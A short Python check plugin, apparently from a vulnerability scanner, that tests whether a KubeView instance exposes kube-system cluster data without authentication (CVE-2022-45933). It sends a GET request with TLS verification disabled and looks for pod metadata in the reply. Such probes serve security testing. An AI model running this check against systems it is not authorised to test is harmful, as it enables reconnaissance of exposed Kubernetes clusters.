#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/uAb1L0o8ApNS44bvnlOeGQ?search_click_id=18058210280621813128-1693375399345-0563355995',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'KubeView未授权访问 CVE-2022-45933',

      'level'     :   'low',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = 'api/scrape/kube-system'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'pods.*?metadata.*?pod-template-hash.*?ownerReferences.*?',res.text,re.S):
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret